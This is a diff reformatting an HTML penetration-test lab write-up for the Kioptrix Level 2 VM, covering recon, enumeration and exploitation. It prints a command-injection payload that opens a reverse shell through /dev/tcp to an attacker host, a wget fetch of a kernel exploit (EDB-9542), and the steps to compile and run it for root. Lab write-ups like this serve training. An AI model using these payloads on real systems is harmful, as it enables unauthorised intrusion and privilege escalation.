@@ -133,12 +133,7 @@
 <p>Identify the live host on the network, discover open ports, identify running services and their versions, and fingerprint the operating system.</p>
 <h3 id="findings">Findings</h3>
 <p>Host discovery was performed using <code>arp-scan</code> on the local network, which identified the target at <code>172.20.10.4</code>. A subsequent Nmap scan with service version detection and OS fingerprinting revealed six open ports: SSH (22), HTTP (80), HTTPS (443), rpcbind (111), CUPS (631), and MySQL (3306). The web server was identified as Apache 2.0.52 running on CentOS. OS detection placed the kernel in the Linux 2.6.9–2.6.30 range. MySQL returned an “unauthorized” banner, indicating no anonymous access.</p>
-<p><strong>PoC:</strong>
-- <strong>Tools used</strong>: arp-scan, Nmap
-- <strong>Commands</strong>:
-- <code>arp-scan -l</code>
-- <code>nmap -sV -O 172.20.10.4</code>
-- <strong>Result</strong>: Target identified. Open ports: 22 (SSH 3.9p1), 80 (Apache 2.0.52), 111 (rpcbind), 443 (Apache 2.0.52), 631 (CUPS 1.1), 3306 (MySQL — unauthorized). OS: Linux 2.6.9–2.6.30.</p>
+<p><strong>PoC:</strong><br>- <strong>Tools used</strong>: arp-scan, Nmap<br>- <strong>Commands</strong>:<br>- <code>arp-scan -l</code><br>- <code>nmap -sV -O 172.20.10.4</code><br>- <strong>Result</strong>: Target identified. Open ports: 22 (SSH 3.9p1), 80 (Apache 2.0.52), 111 (rpcbind), 443 (Apache 2.0.52), 631 (CUPS 1.1), 3306 (MySQL — unauthorized). OS: Linux 2.6.9–2.6.30.</p>
 <hr>
 <h2 id="enumeration">Enumeration</h2>
 <h3 id="objective">Objective</h3>
@@ -147,16 +142,7 @@
 <p><strong>Web enumeration</strong> revealed that the HTTPS service on port 443 was inaccessible due to an unsupported SSL version. Port 80 returned the default Apache test page at the root. Directory brute-forcing with Gobuster uncovered <code>index.php</code>, which presented a web login form — a significant finding missed by simply browsing to <code>/</code>.</p>
 <p><strong>SMB enumeration</strong> using enum4linux identified several usernames (<code>administrator</code>, <code>root</code>, <code>bin</code>, <code>guest</code>, <code>none</code>) but failed to establish a session, making SMB a dead end.</p>
 <p><strong>Service exploit research</strong> was conducted for each enumerated service. Searchsploit and Metasploit were used to query exploits for Apache 2.0.52, rpcbind, and CUPS 1.1. Apache results returned no reliable remote code execution modules. rpcbind results were limited to denial-of-service. CUPS 1.1 had searchsploit entries but no matching Metasploit modules and no exploitable remote vector. All three services were ruled out as initial access vectors.</p>
-<p><strong>PoC:</strong>
-- <strong>Tools used</strong>: Gobuster, enum4linux, searchsploit, Metasploit
-- <strong>Commands</strong>:
-- <code>gobuster dir -u http://172.20.10.4 -w &lt;wordlist&gt;</code>
-- <code>enum4linux 172.20.10.4</code>
-- <code>searchsploit apache 2.0.52</code>
-- <code>searchsploit rpcbind</code>
-- <code>searchsploit cups 1.1</code>
-- <code>msfconsole</code> → <code>search apache 2.0</code> / <code>search rpcbind</code> / <code>search cups 1.1</code>
-- <strong>Result</strong>: <code>index.php</code> discovered (HTTP 200). Usernames enumerated via SMB. No exploitable remote vulnerabilities found for Apache, rpcbind, or CUPS via searchsploit or Metasploit.</p>
+<p><strong>PoC:</strong><br>- <strong>Tools used</strong>: Gobuster, enum4linux, searchsploit, Metasploit<br>- <strong>Commands</strong>:<br>- <code>gobuster dir -u http://172.20.10.4 -w &lt;wordlist&gt;</code><br>- <code>enum4linux 172.20.10.4</code><br>- <code>searchsploit apache 2.0.52</code><br>- <code>searchsploit rpcbind</code><br>- <code>searchsploit cups 1.1</code><br>- <code>msfconsole</code> → <code>search apache 2.0</code> / <code>search rpcbind</code> / <code>search cups 1.1</code><br>- <strong>Result</strong>: <code>index.php</code> discovered (HTTP 200). Usernames enumerated via SMB. No exploitable remote vulnerabilities found for Apache, rpcbind, or CUPS via searchsploit or Metasploit.</p>
 <hr>
 <h2 id="exploitation-initial-foothold">Exploitation — Initial Foothold</h2>
 <h3 id="description">Description</h3>
@@ -173,8 +159,7 @@
 <p><strong>Phase 2 — Command Injection → Reverse Shell</strong></p>
 <ol>
   <li>On the attacker machine, start a Netcat listener: <code>nc -lvnp 4444</code>.</li>
-  <li>In the ping utility field on <code>pingit.php</code>, submit the following payload:
-<code>172.20.10.4 &amp; sh -i &gt;&amp; /dev/tcp/172.20.10.5/4444 0&gt;&amp;1</code></li>
+  <li>In the ping utility field on <code>pingit.php</code>, submit the following payload:<br><code>172.20.10.4 &amp; sh -i &gt;&amp; /dev/tcp/172.20.10.5/4444 0&gt;&amp;1</code></li>
   <li>The application executes the injected command. A reverse shell connects back to the listener.</li>
   <li>Confirm access: <code>whoami</code> returns <code>apache</code>; <code>id</code> returns <code>uid=48(apache) gid=48(apache)</code>.</li>
   <li>Confirm kernel version: <code>uname -a</code> returns <code>Linux kioptrix.level2 2.6.9-55.EL</code>.  <figure><img src="images/kioptrix-level-2/396b7523717280509f75ea1543e4e07b.png" alt="screenshot" loading="lazy"></figure>
@@ -191,14 +176,11 @@
 <p>The target kernel version (2.6.9-55.EL) is affected by CVE-2009-2698, a local privilege escalation vulnerability in the <code>ip_append_data()</code> function within the Linux kernel’s UDP socket handling. Exploitation causes a Ring 0 privilege escalation, granting full root access. The exploit (EDB-9542) was identified via searchsploit, transferred to the target, compiled in place, and executed.</p>
 <h3 id="poc-steps-to-reproduce">PoC — Steps to Reproduce</h3>
 <ol>
-  <li>On the attacker machine, search for a suitable kernel exploit:
-<code>searchsploit linux kernel 2.6.9 local privilege</code></li>
+  <li>On the attacker machine, search for a suitable kernel exploit:<br><code>searchsploit linux kernel 2.6.9 local privilege</code></li>
   <li>Identify exploit <code>linux_x86/local/9542.c</code> (CVE-2009-2698).</li>
   <li>Copy the exploit to the working directory: <code>searchsploit -m linux_x86/local/9542.c</code>.</li>
-  <li>Serve the exploit over HTTP from the attacker machine:
-<code>python3 -m http.server 8080</code></li>
-  <li>On the reverse shell (as <code>apache</code>), navigate to a writable directory and download the exploit:
-<code>cd /tmpwget http://172.20.10.5:8080/9542.c</code></li>
+  <li>Serve the exploit over HTTP from the attacker machine:<br><code>python3 -m http.server 8080</code></li>
+  <li>On the reverse shell (as <code>apache</code>), navigate to a writable directory and download the exploit:<br><code>cd /tmpwget http://172.20.10.5:8080/9542.c</code></li>
   <li>Compile the exploit on the target: <code>gcc 9542.c -o exploit</code></li>
   <li>Execute the exploit: <code>./exploit</code></li>
   <li>Confirm root: <code>whoami</code> returns <code>root</code>; <code>id</code> returns <code>uid=0(root) gid=0(root) groups=48(apache)</code>.  <figure><img src="images/kioptrix-level-2/396b7523717280bd96fec73d444fcff2.png" alt="screenshot" loading="lazy"></figure>
